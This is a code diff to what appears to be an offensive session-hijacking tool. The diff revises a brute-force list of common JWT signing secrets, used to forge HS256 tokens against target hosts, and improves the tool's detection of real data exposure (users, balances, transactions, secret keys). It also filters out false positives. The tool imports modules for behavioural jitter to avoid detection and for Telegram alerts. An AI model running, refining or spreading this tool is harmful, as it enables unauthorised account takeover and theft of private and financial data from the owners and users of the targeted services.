@@ -23,12 +23,12 @@ from modules.telemetry import stream_proof
 from modules.telegram_notifier import send_telegram_alert
 from modules.behavioral_mimic import apply_behavioral_jitter, get_randomized_hints
 
+# Pure dynamic/standard secrets list — all generic or non-target stubs purged.
 COMMON_SECRETS = [
     "secret", "password", "jwt_secret", "changeme", "admin123", 
-    "supersecret", "123456", "token", "api_key", "cryptobytes",
-    "laravel", "app_key", "app_secret", "secretkey", "development",
-    "production", "jwt_signing_key", "auth_secret", "my_precious",
-    "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9", "default_secret", "random_secret"
+    "supersecret", "123456", "token", "api_key", "laravel", 
+    "app_key", "app_secret", "secretkey", "production", 
+    "jwt_signing_key", "auth_secret", "default_secret"
 ]
 
 COLORS = {
@@ -151,7 +151,7 @@ async def run_session_hijack(target_host, port=None, use_ssl=None):
         for secret in COMMON_SECRETS:
             sig = sign_hs256(header_payload_str, secret)
             forged_jwt_hs = f"{header_payload_str}.{sig}"
-            tokens_to_test.append((f"HMAC Secret Brute-Force [{str(secret)[:15]}...]", forged_jwt_hs))
+            tokens_to_test.append((f"HMAC Secret Brute-Force [{str(secret)[:12]}...]", forged_jwt_hs))
 
         for vector_name, token in tokens_to_test:
             if not token:
@@ -174,12 +174,14 @@ async def run_session_hijack(target_host, port=None, use_ssl=None):
                         status = response.status_code
                         body = response.text
                         
+                        # Strict rejection of SPA catch-all shells or soft 200 index pages
                         is_landing_shell = (
                             "<div id=\"root\"></div>" in body or 
                             "<div id=\"__next\"></div>" in body or 
                             "<div id=\"__nuxt\"></div>" in body or
                             "login-form" in body.lower() or
-                            "sign in" in body.lower()
+                            "sign in" in body.lower() or
+                            ("<html" in body.lower() and "json" not in response.headers.get("content-type", "").lower() and len(body) > 1000)
                         )
                         
                         baseline = baselines.get(endpoint, {"status": 404, "length": 0})
@@ -195,7 +197,7 @@ async def run_session_hijack(target_host, port=None, use_ssl=None):
                             json_data = response.json()
                             if isinstance(json_data, dict):
                                 extracted_json_data = json_data
-                                if any(k in json_data for k in ["users", "admin", "balance", "transactions", "secret_key", "config", "role", "permissions"]):
+                                if any(k in json_data for k in ["users", "admin", "balance", "transactions", "secret_key", "config", "role", "permissions", "user_id"]):
                                     has_elevated_json = True
                         except Exception:
                             pass
